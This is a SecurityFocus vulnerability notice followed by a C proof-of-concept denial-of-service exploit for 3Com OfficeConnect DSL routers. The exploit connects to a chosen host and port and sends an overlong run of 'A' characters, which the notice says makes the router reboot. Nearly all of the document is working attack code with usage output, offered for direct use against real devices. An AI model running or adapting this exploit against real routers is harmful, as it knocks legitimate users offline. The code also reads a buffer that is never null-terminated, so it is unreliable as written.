// source: https://www.securityfocus.com/bid/8248/info

A problem in the 3Com 812 OfficeConnect has been reported that may result in the router becoming unstable. Because of this, an attacker may be able to deny service to legitimate users of the vulnerable router by submitting an excessively long request.

/* 3com-DoS.c
 *
 * PoC DoS exploit for 3Com OfficeConnect DSL Routers.
 This PoC exploit the
 * vulnerability documented at:
<https://www.securityfocus.com/bid/8248>,
 * discovered by David F. Madrid.
 *
 * Successful exploitation of the vulnerability should
cause the router to
 * reboot.  It is not believed that arbitrary code
execution is possible -
 * check advisory for more information.
 *
 * -shaun2k2
 */


#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>

int main(int argc, char *argv[]) {
        if(argc < 3) {
                printf("3Com OfficeConnect DSL Router DoS exploit by
shaun2k2 - <shaunige@yahoo.co.uk>\n\n");
                printf("Usage: 3comDoS <3com_router> <port>\n");
                exit(-1);
        }

        int sock;
        char explbuf[521];
        struct sockaddr_in dest;
        struct hostent *he;

        if((he = gethostbyname(argv[1])) == NULL) {
                printf("Couldn't resolve %s!\n", argv[1]);
                exit(-1);
        }

        if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                perror("socket()");
                exit(-1);
        }

        printf("3Com OfficeConnect DSL Router DoS exploit by
shaun2k2 - <shaunige@yahoo.co.uk>\n\n");

        dest.sin_addr = *((struct in_addr *)he->h_addr);
        dest.sin_port = htons(atoi(argv[2]));
        dest.sin_family = AF_INET;

        printf("[+] Crafting exploit buffer.\n");
        memset(explbuf, 'A', 512);
        memcpy(explbuf+512, "\n\n\n\n\n\n\n\n", 8);

        if(connect(sock, (struct sockaddr *)&dest,
sizeof(struct sockaddr)) == -1) {
                perror("connect()");
                exit(-1);
        }

        printf("[+] Connected...Sending exploit buffer!\n");
        send(sock, explbuf, strlen(explbuf), 0);
        sleep(2);
        close(sock);
        printf("\n[+] Exploit buffer sent!\n");
        return(0);
}